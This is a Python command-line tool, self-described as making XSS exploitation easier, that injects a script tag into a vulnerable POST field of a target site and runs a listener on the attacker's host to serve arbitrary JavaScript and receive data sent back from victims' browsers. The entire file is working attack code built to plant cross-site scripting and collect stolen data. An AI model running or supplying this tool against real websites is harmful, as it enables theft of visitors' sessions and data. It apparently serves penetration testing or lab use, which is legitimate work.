#!/usr/bin/env python3
from argparse import ArgumentParser
from requests import post, exceptions
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from urllib.parse import unquote

class ReceiverBaseServer(BaseHTTPRequestHandler):

    def log_message(self, *args):
        return

    def do_POST(self):
        self.send_response(200)
        print("Received POST request. Reading body:")
        
        bodySize = int(self.headers.get('Content-Length'))
        bodyBytes = self.rfile.read(bodySize)

        try:
            body = str(bodyBytes, "utf-8")
            print(body)
        except UnicodeDecodeError:
            outputFilename = "latestReceived"
            print(f"Received non-unicode data. Writing data to './{outputFilename}'")
            with open(outputFilename, "wb") as output:
                output.write(bodyBytes)

        self.server.stopAsync()

    def do_GET(self):
        self.send_response(200)
        print(f"Received GET request to {self.path}. Sending javascript..")

        self.send_header("Content-Type", "application/javascript")
        self.end_headers()
        
        with open(self.server.jsfile, "rb") as payload:
            self.wfile.write(payload.read())

class ResponderServer(HTTPServer):

    def __init__(self, lhost: str, lport: int, jsFilepath: str):
        HTTPServer.__init__(self, (lhost, lport), ReceiverBaseServer)
        self.jsfile = jsFilepath
        self.serverThread = None

    def triggerXSS(self, targetUrl: str, vulnerableKey: str, otherValues: dict):
        print("Sending XSS-trigger request..")
        lhost, lport = self.server_address
        payload = f"<script src=\"http://{lhost}:{lport}\"></script>"

        data = {vulnerableKey: payload}
        data.update(otherValues)

        contentType = {"Content-Type": "application/x-www-form-urlencoded"}

        try:
            post(targetUrl, data=data, headers=contentType, timeout=5)
            print("XSS-trigger sent")
        except exceptions.ReadTimeout:
            print("The XSS-trigger request timed out")

    def start(self):
        if self.serverThread != None:
            print("Server already running")
        thread = Thread(target=self.serve_forever)
        self.serverThread = thread
        thread.start()

    def stop(self):
        if self.serverThread == None:
            print("Server is not running")
        self.shutdown()
        self.serverThread.join()

    def stopAsync(self):
        Thread(target=self.stop).start()

def parseFormData(data: str) -> dict:
    result = {}
    keyValues = data.split('&')
    for keyValue in keyValues:
        key, value = keyValue.split('=')
        result[unquote(key)] = unquote(value)
    return result

def getArguments():
    parser = ArgumentParser(description="Tool to make XSS exploitation easier")
    parser.add_argument("-p", "--lport", required=False, default=4444, type=int, help="The listening port to use (Default: 4444)")
    parser.add_argument("-l", "--lhost", required=True, help="The listening host to use")
    parser.add_argument("-u", "--url", required=True, help="The target POST endpoint vulnerable to XSS (e.g: http://mysite/contact.php)")
    parser.add_argument("-f", "--file", required=True, help="The javascript file that will be executed via the XSS")
    parser.add_argument("-k", "--key", required=True, help="The POST key vulnerable to XSS")
    parser.add_argument("-d", "--data", required=False, help="The POST data to send along (Formatted as x-www-form-urlencoded. Must not contain the vulnerable key (-k))")
    return parser.parse_args()

def main():
    args = getArguments()
    url = args.url if args.url.startswith("http") else f"http://{args.url}"
    data = parseFormData(args.data)
    responder = ResponderServer(args.lhost, args.lport, args.file)
    responder.start()

    responder.triggerXSS(url, args.key, data)

if __name__ == "__main__":
    main()
